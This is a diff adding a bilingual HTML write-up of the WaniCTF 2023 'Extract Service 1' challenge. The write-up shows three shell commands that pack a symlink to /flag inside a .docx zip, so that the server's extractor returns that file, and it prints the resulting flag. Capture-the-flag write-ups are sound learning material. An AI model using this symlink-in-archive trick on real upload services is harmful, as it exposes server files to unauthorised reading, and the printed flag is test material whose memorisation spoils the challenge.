@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Extract Service 1 (WaniCTF 2023) Writeup</title>
+<script src="../../../../common/common.js"></script>
+</head>
+<body>
+<language-selector data-langlist="日本語,ja,English,en"></language-selector>
+<h1>Extract Service 1</h1>
+<div class="language-selector-ja" lang="ja">
+<p>
+WebページのURLと、サーバー用のファイル一式が与えられた。<br>
+また、問題文より、ファイル <code>/flag</code> を読めば良さそうであることがわかった。
+</p>
+<p>
+与えられたファイル中の <code>main.go</code> を読むと、与えられたzipファイルからファイルを取り出して返してくれそうなことがわかった。<br>
+さらに、指定のWebページにアクセスしてソースを表示すると、取り出すファイルのパスをフォームで指定できるようだった。
+</p>
+<p>
+そこで、<common-tool data-lang="ja">CS50 Sandbox</common-tool> を開き、以下のコマンドで、取り出すファイルを <code>/flag</code> へのシンボリックリンクとした <code>attack.docx</code> を作成した。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+An URL of a web page and files for the server were given.<br>
+Also the challenge description suggested that we should read the file <code>/flag</code>.
+</p>
+<p>
+I read one of the given files <code>main.go</code> and found that it should extract a file from a zip file sent and return the file.<br>
+Also, I viewed the source of the specified web page and found that the path to extract can be specified from the form.
+</p>
+<p>
+Seeing this, I opened <common-tool data-lang="en">CS50 Sandbox</common-tool> and executed these commands to create a file <code>attack.docx</code> where the file to extract is a symbolic link to <code>/flag</code>.
+</p>
+</div>
+<code-block data-extension="txt">
+mkdir word
+ln -s /flag word/document.xml
+zip -ry attack.docx word
+</code-block>
+
+<p class="language-selector-ja" lang="ja">
+フォームの Choose file type で「.docx」を選択し、作成した <code>attack.docx</code> を送信すると、flagが得られた。
+</p>
+<p class="language-selector-en" lang="en">
+I selected ".docx" for the "Choose file type" in the form and uploaded the file <code>attack.docx</code> to obtain the flag.
+</p>
+
+<div class="flag">FLAG{ex7r4c7_1s_br0k3n_by_b4d_p4r4m3t3rs}</div>
+<hr>
+<writeup-by></writeup-by>
+<p>
+<a href="../../" class="language-aware-link">WaniCTF 2023</a>
+</p>
+</body>
+</html>
